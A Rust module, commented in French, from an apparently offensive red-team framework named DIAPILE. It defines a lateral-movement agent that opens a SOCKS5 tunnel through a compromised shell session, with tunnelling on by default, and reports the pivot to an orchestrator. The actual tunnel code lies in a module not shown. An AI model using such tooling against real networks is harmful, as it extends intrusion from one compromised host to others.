//! DIAPILE — Lateral Agent
//!
//! Agent dédié au mouvement latéral : il transforme une session compromise en
//! point d'appui réseau (tunnel SOCKS5 routé par le shell), sans jamais écrire
//! dans la mémoire de campagne. Il consomme un `AgentBrief` borné et rend un
//! `AgentReport` structuré — l'orchestrateur seul décide de la promotion.
//!
//! ⚠️ RÉSERVÉ AUX OPÉRATIONS RED TEAM AUTORISÉES.
#![allow(dead_code)]

use crate::agents::{AgentBrief, AgentReport, AgentRole};
use crate::shell::SessionManager;
use serde::{Deserialize, Serialize};
use std::sync::Arc;

// ─────────────────────────────────────────────────────────────────────────────
// Types
// ─────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LateralAgentConfig {
    /// Base de la plage de ports SOCKS5 locaux (1090 + session_id % 100).
    pub socks_port_base: u16,
    /// Autoriser l'ouverture effective du tunnel (sinon dry/plan seulement).
    pub open_tunnel: bool,
}

impl Default for LateralAgentConfig {
    fn default() -> Self {
        Self {
            socks_port_base: 1090,
            open_tunnel: true,
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// LateralAgent
// ─────────────────────────────────────────────────────────────────────────────

pub struct LateralAgent {
    config: LateralAgentConfig,
    mgr: Arc<SessionManager>,
}

impl LateralAgent {
    pub fn new(config: LateralAgentConfig, session_mgr: Arc<SessionManager>) -> Self {
        Self {
            config,
            mgr: session_mgr,
        }
    }

    /// Ouvre un tunnel SOCKS5 route par la session compromise `session_id`.
    ///
    /// L'agent ne connaît ni la campagne ni les autres hôtes : uniquement le
    /// brief (objectif + cible) et l'identifiant de session qui lui est confié.
    pub async fn run(&self, brief: &AgentBrief, session_id: usize) -> AgentReport {
        let mut report = AgentReport::new(AgentRole::Lateral, brief.target.clone(), String::new());

        if !self.config.open_tunnel {
            report.summary = format!("Pivot {} — tunnel désactivé (config)", brief.target);
            return report;
        }

        let Some(session) = self.mgr.get(session_id).await else {
            let msg = format!("session {} introuvable dans le SessionManager", session_id);
            println!("   ⚠️  [LATERAL-AGENT] {}", msg);
            report.errors.push(msg);
            report.summary = format!("Pivot {} abandonné", brief.target);
            return report;
        };

        let socks_port = self.config.socks_port_base + (session_id as u16 % 100);
        let mgr = self.mgr.clone();

        println!(
            "   \x1b[38;5;196m[LATERAL-AGENT]\x1b[0m SOCKS5 127.0.0.1:{} via session {} ({}:{})",
            socks_port, session_id, session.remote_ip, session.remote_port
        );
        println!(
            "   \x1b[90mproxychains4 → socks5 127.0.0.1 {}\x1b[0m",
            socks_port
        );

        // Le proxy tourne en tâche de fond : l'agent rend la main immédiatement.
        tokio::spawn(async move {
            let _ = crate::pivot::start_socks5_via_session(socks_port, mgr, session_id).await;
        });

        report.summary = format!(
            "Tunnel SOCKS5 127.0.0.1:{} ouvert via session {} ({})",
            socks_port, session_id, session.remote_ip
        );
        report.findings.push(format!(
            "socks5:127.0.0.1:{}:via_session_{}:pivot_host={}",
            socks_port, session_id, session.remote_ip
        ));
        report
    }
}
